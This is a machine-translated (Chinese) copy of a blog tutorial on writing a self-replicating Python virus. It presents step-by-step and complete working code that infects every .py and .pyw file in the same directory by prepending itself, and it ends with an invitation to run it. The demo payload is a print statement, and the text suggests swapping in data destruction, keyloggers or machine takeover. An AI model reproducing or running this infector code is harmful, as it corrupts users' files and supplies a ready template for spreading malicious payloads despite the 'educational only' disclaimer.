<html>
<head>
<title>Make a Self-Replicating Virus in Python | For Education Purposes Only</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">用Python制作一个自我复制的病毒|仅用于教育目的</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/make-a-self-replicating-virus-in-python-bb29404e3f6b?source=collection_archive---------0-----------------------#2020-11-24">https://infosecwriteups.com/make-a-self-replicating-virus-in-python-bb29404e3f6b?source=collection_archive---------0-----------------------#2020-11-24</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/6b5a57daa95acc16647c0179370d8ba7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*6YPCzJtFpnVn_2pC"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><a class="ae kc" href="https://unsplash.com/@kobuagency?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> KOBU机构</a>在<a class="ae kc" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure></div><div class="ab cl kd ke hu kf" role="separator"><span class="kg bw bk kh ki kj"/><span class="kg bw bk kh ki kj"/><span class="kg bw bk kh ki"/></div><div class="ij ik il im in"><p id="28a3" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated"><strong class="km ir">合十礼！*肘撞*&amp;*脚抖* </strong></p><p id="c762" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">希望你和你的家人在这个不确定和前所未有的时期健康和安全。在这篇文章中，我们将学习如何用python制作一个简单的计算机病毒。</p><p id="2889" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">这种python病毒很像新型冠状病毒病毒，旨在从一个主机传播到另一个主机，并具有自我复制的能力。用更专业的术语来说，我们将编写一个程序，用自我复制代码感染6英尺距离(同一目录)内的所有python文件，并通过受感染的python文件执行恶意活动。</p><p id="67da" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">在我们开始之前，请戴上口罩并清洁双手</p><blockquote class="li lj lk"><p id="c8ea" class="kk kl ll km b kn ko kp kq kr ks kt ku lm kw kx ky ln la lb lc lo le lf lg lh ij bi translated"><strong class="km ir">免责声明:本教程仅用于教育目的，无意促进任何非法活动。作者不对所提供信息的任何误用负责。</strong></p></blockquote><h1 id="988e" class="lp lq iq bd lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm bi translated">辅导的</h1><p id="d534" class="pw-post-body-paragraph kk kl iq km b kn mn kp kq kr mo kt ku kv mp kx ky kz mq lb lc ld mr lf lg lh ij bi translated">完整的病毒程序基本上有三个部分-</p><ol class=""><li id="e773" class="ms mt iq km b kn ko kr ks kv mu kz mv ld mw lh mx my mz na bi translated"><strong class="km ir">复制整个病毒程序本身。</strong></li><li id="94dc" class="ms mt iq km b kn nb kr nc kv nd kz ne ld nf lh mx my mz na bi translated"><strong class="km ir">获取其他python文件，用复制代码感染它们。</strong></li><li id="ed42" class="ms mt iq km b kn nb kr nc kv nd kz ne ld nf lh mx my mz na bi translated"><strong class="km ir">部署有效负载或恶意软件/间谍软件代码。</strong></li></ol><p id="7db8" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">为了标记病毒程序的开始和结束，我们需要在代码的第一行和最后一行放置标签。</p><pre class="ng nh ni nj gt nk nl nm nn aw no bi"><span id="ca36" class="np lq iq nl b gy nq nr l ns nt"># VIRUS SAYS HI!</span><span id="bb3d" class="np lq iq nl b gy nu nr l ns nt">{ virus code }</span><span id="2a6f" class="np lq iq nl b gy nu nr l ns nt"># VIRUS SAYS BYE!</span></pre><p id="0b42" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">接下来，我们导入所有需要的python库。</p><pre class="ng nh ni nj gt nk nl nm nn aw no bi"><span id="0c5b" class="np lq iq nl b gy nq nr l ns nt">import sys<br/>import glob</span></pre><p id="4ee1" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated"><strong class="km ir">第1部分:</strong>我们将通过创建一个空数组并动态获取当前文件名来打开和读取它，从而在这里编写自复制代码。</p><pre class="ng nh ni nj gt nk nl nm nn aw no bi"><span id="011f" class="np lq iq nl b gy nq nr l ns nt">virus_code = []<br/><br/>with open(sys.argv[0], 'r') as f:<br/>    lines = f.readlines()</span></pre><p id="41d7" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">现在，我们将定义一个bool变量来帮助我们了解要复制的程序区域，即开始和结束标记之间的区域。然后，我们将遍历所有的行，并将它们复制到预先初始化的数组中，直到到达末尾。</p><pre class="ng nh ni nj gt nk nl nm nn aw no bi"><span id="d5c3" class="np lq iq nl b gy nq nr l ns nt">self_replicating_part = False<br/>for line in lines:<br/>    if line == "# VIRUS SAYS HI!":<br/>        self_replicating_part = True<br/>    if not self_replicating_part:<br/>        virus_code.append(line)<br/>    if line == "# VIRUS SAYS BYE!\n":<br/>        break</span></pre><p id="1bb6" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated"><strong class="km ir">第2部分:</strong>为了找到当前目录中的所有python文件，我们将使用glob模块，并根据所需的模式匹配路径名。然后，我们将保存这些文件，并逐个读取它们，以感染我们的病毒代码。</p><p id="ef15" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">在这里，我们将首先检查文件是否已经被感染，即查看文件是否已经包含开始标记。如果是这样，我们就进入下一个文件，如果不是这样，我们就通过将自我复制的病毒代码添加到现有的文件代码中来感染它，以便保留原来的功能。</p><pre class="ng nh ni nj gt nk nl nm nn aw no bi"><span id="1d61" class="np lq iq nl b gy nq nr l ns nt">python_files = glob.glob('*.py') + glob.glob('*.pyw')<br/><br/>for file in python_files:<br/>    with open(file, 'r') as f:<br/>        file_code = f.readlines()<br/><br/>    infected = False<br/><br/>    for line in file_code:<br/>        if line == "# VIRUS SAYS HI!\n":<br/>            infected = True<br/>            break<br/><br/>    if not infected:<br/>        final_code = []<br/>        final_code.extend(virus_code)<br/>        final_code.extend('\n')<br/>        final_code.extend(file_code)<br/><br/>        with open(file, 'w') as f:<br/>            f.writelines(final_code)</span></pre><p id="e0bb" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">第三部分:最后，我们需要将我们的恶意代码或有效载荷添加到程序中，充当恶意软件，它可以破坏系统、破坏数据、下载其他病毒、窃取密码(<a class="ae kc" href="https://medium.com/analytics-vidhya/python-keylogger-tutorial-ef178d02f24a" rel="noopener">运行键盘记录器</a>)或者可能接管整个机器。</p><p id="e230" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">现在，我们将只是添加一个无害的打印声明<strong class="km ir">*邪恶的笑声* </strong></p><pre class="ng nh ni nj gt nk nl nm nn aw no bi"><span id="868f" class="np lq iq nl b gy nq nr l ns nt">def malicious_code():<br/>    print("YOU HAVE BEEN INFECTED HAHAHA !!!")<br/><br/>malicious_code()</span></pre><p id="34dd" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">我们完了。这是完整的程序放在一起的样子——</p><pre class="ng nh ni nj gt nk nl nm nn aw no bi"><span id="10e3" class="np lq iq nl b gy nq nr l ns nt"># VIRUS SAYS HI!<br/><br/>import sys<br/>import glob<br/><br/>virus_code = []<br/><br/>with open(sys.argv[0], 'r') as f:<br/>    lines = f.readlines()<br/><br/>self_replicating_part = False<br/>for line in lines:<br/>    if line == "# VIRUS SAYS HI!":<br/>        self_replicating_part = True<br/>    if not self_replicating_part:<br/>        virus_code.append(line)<br/>    if line == "# VIRUS SAYS BYE!\n":<br/>        break<br/><br/>python_files = glob.glob('*.py') + glob.glob('*.pyw')<br/><br/>for file in python_files:<br/>    with open(file, 'r') as f:<br/>        file_code = f.readlines()<br/><br/>    infected = False<br/><br/>    for line in file_code:<br/>        if line == "# VIRUS SAYS HI!\n":<br/>            infected = True<br/>            break<br/><br/>    if not infected:<br/>        final_code = []<br/>        final_code.extend(virus_code)<br/>        final_code.extend('\n')<br/>        final_code.extend(file_code)<br/><br/>        with open(file, 'w') as f:<br/>            f.writelines(final_code)<br/><br/>def malicious_code():<br/>    print("YOU HAVE BEEN INFECTED HAHAHA !!!")<br/><br/>malicious_code()<br/><br/># VIRUS SAYS BYE!</span></pre><p id="46f0" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">在同一个目录下创建一些测试文件，小心地执行你自己的自我复制病毒！</p><figure class="ng nh ni nj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nv"><img src="../Images/23557f54e6cd3d3ac6480f767aa79ffb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mMhMzQoNOV1u7ToJ3Jpawg.png"/></div></div></figure><h1 id="d01a" class="lp lq iq bd lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm bi translated">结论</h1><p id="3b35" class="pw-post-body-paragraph kk kl iq km b kn mn kp kq kr mo kt ku kv mp kx ky kz mq lb lc ld mr lf lg lh ij bi translated">用执行大量抽象的高级编程语言编写病毒实用吗？用python这样的解释型语言编写一个病毒实用吗？在这种语言中，代码是不隐藏的，任何运行它的人都可以很容易地查看代码。嗯，什么时候编写病毒是一件实际可行的事情…</p><p id="f825" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">如果你喜欢这篇文章，并且想学习一些新的东西，请点击拍手按钮告诉我:)</p><p id="d697" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated">谢谢，保重，不要在家里尝试这个！</p><blockquote class="li lj lk"><p id="af26" class="kk kl ll km b kn ko kp kq kr ks kt ku lm kw kx ky ln la lb lc lo le lf lg lh ij bi translated">支持我<a class="ae kc" href="https://www.buymeacoffee.com/djrobin17" rel="noopener ugc nofollow" target="_blank">https://www.buymeacoffee.com/djrobin17</a></p></blockquote><h1 id="448c" class="lp lq iq bd lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm bi translated">参考</h1><figure class="ng nh ni nj gt jr"><div class="bz fp l di"><div class="nw nx l"/></div></figure><p id="d28f" class="pw-post-body-paragraph kk kl iq km b kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh ij bi translated"><em class="ll">附注:信息安全领域每天都会出现很多难以跟上的内容。加入我们的</em> <strong class="km ir"> <em class="ll">每周简讯</em> </strong> <em class="ll">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个</em> <strong class="km ir"> <em class="ll">工作提醒的形式免费获取所有最新的信息安全趋势！</em>【https://weekly.infosecwriteups.com/】<em class="ll"/><a class="ae kc" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"><em class="ll"/></a></strong></p></div></div>    
</body>
</html>